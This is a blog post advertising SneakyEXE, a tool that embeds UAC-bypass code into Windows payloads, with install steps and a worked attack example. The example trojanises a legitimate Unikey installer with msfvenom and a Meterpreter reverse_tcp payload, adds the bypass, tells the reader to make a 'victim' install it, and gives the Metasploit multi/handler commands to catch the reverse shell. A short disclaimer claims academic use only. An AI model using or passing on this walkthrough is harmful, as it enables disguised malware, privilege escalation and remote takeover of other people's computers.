---
title: 'SneakyEXE: An "UAC-Bypassing" Codes Embedding Tool For Your Win32 Payload'
date: 2019-10-02T12:40:00+01:00
draft: false
---

[![](https://1.bp.blogspot.com/-aodAz4NRodw/XZSMXTn05oI/AAAAAAAAO0E/86dpZikk630ThDoKYuVn6_MC5OKVgv90ACLcBGAsYHQ/s1600/SneakyEXE%2Bhelp.png)](https://1.bp.blogspot.com/-aodAz4NRodw/XZSMXTn05oI/AAAAAAAAO0E/86dpZikk630ThDoKYuVn6_MC5OKVgv90ACLcBGAsYHQ/s1600/SneakyEXE%2Bhelp.png)

**About SneakyEXE**  
   SneakyEXE is a tool which helps you embedding a UAC-Bypassing function into your custom Win32 payloads (x86\_64 architecture specifically).  
  
**_SneakyEXE was tested on:_**  

*   Windows 7, 8, 10 (64 bit)
*   Parrot Security OS 4.7

  

   **_Requirements of SneakyEXE:_**

*   _For Linux:_   Architecture: Optional  
       Python 3.7.x: Yes  
       Module: [termcolor](https://pypi.org/project/termcolor/)  
       Distro: Any  
       Distro version: Any
*   _For Windows:_   Architecture: x86\_64  
       Python 3.7.x: No  
       Module: No  
       Windows version: 7, 8, 10

  
**SneakyEXE's Installtion for Linux**  
_You must install Python 3 first:_

*   For Debian-based distros: `sudo apt install python3`
*   For Arch Linux based distros: `sudo pacman -S python3`

   _And then, open your Terminal and enter these commands:_

  

  
**SneakyEXE's Installtion for Windows**

*   Download [SneakEXE-master zip file](https://github.com/Zenix-Blurryface/SneakyEXE/archive/master.zip).
*   Unzip it into your optional directory.
*   Change dir to `\SneakyEXE\Win32\`.
*   Execute `sneakyexe.exe` (or `sys\sneakyexe.exe` for an improved startup speed).
*   (Optional : you can copy `sneakyexe.exe` to whatever directory you want and delete the unzipped one)

   _NOTE:_ The payload can only be successfully executed by the user with Administrator privilege. Users with limited token wouldn't succeed.  
  
**SneakyEXE GUI verion installation for Windows**  
   You must install Python 3 first. Download and run **Python 3.7.x setup file** from [Python.org](http://python.org/). On **Install Python 3.7**, enable **Add Python 3.7 to PATH**.  
   Download [SneakEXE-master zip file and unzip it](https://github.com/Zenix-Blurryface/SneakyEXE/archive/master.zip).  
   And then, open PowerShell or CMD on SneakyEXE folder where you have just unzipped SneakyEXE-master and enter these command:  
  
`pip install pillow  
pip install pyinstaller  
mkdir compile  
cd compile  
pyinstaller --windowed --onefile --icon=Icon.ico /source/Win32/GUI.py  
cd dist  
GUI.exe`  
  
**How to use SneakyEXE?**  

  
**Example:**  
   I dowloaded Unikey from [Unikey.org](http://unikey.org/).  
   And then, i used `msfvenom` to inject payload to `UniKeyNT.exe` (payload used: `windows/meterpreter/reverse_tcp`). I called the payload file is `uNiKeY.exe`.  

[![](https://1.bp.blogspot.com/-gbe_MdN7r3I/XZSMi9xb9RI/AAAAAAAAO0I/-9XxF5OJJ_YkMgJN18EByHpNoDuDQFNJwCLcBGAsYHQ/s1600/msfvenom%2BuNiKeY.png)](https://1.bp.blogspot.com/-gbe_MdN7r3I/XZSMi9xb9RI/AAAAAAAAO0I/-9XxF5OJJ_YkMgJN18EByHpNoDuDQFNJwCLcBGAsYHQ/s1600/msfvenom%2BuNiKeY.png)

  
   After that, to embed UAC-Bypassing codes to `uNiKeY.exe`, i used this command:  
`python3 sneakyexe bin=/home/hildathedev/uNiKeY.exe out=/home/hildathedev/SneakyEXE`  

[![](https://1.bp.blogspot.com/-q8wQ8NbBv3M/XZSMmp02k-I/AAAAAAAAO0M/3PonyWHBsr0CxXN4kVtQQRSNq5QMgVz1QCLcBGAsYHQ/s1600/SneakyEXE%2BuNiKeY.png)](https://1.bp.blogspot.com/-q8wQ8NbBv3M/XZSMmp02k-I/AAAAAAAAO0M/3PonyWHBsr0CxXN4kVtQQRSNq5QMgVz1QCLcBGAsYHQ/s1600/SneakyEXE%2BuNiKeY.png)

  
  And then, by some how, makes your victim installs the payload that was embedded UAC-Bypassing codes and enter these commands:  
  
`sudo msfconsole -q  
use multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST  
set LHOST  
exploit`  
  
   and wait...  
  
**Disclaimer:**

`*   This tool was made for academic purposes or ethical cases only. I ain't taking any resposibility upon your actions if you abuse this tool for any black-hat acitivity
*   Feel free to use this project in your software, just don't reclaim the ownerhsip.`

  

`**Credits:** This tool does embed UACme which was originally coded by [hfiref0x](https://github.com/hfiref0x) but the rest was pretty much all coded by me ([Zenix Blurryface](https://www.facebook.com/Hackernese.Official)).`

  

`**Author:** Copyright © 2019 by [Zenix Blurryface](https://github.com/Zenix-Blurryface/).`

  

`**[Download SneakyEXE](https://github.com/Zenix-Blurryface/SneakyEXE)**`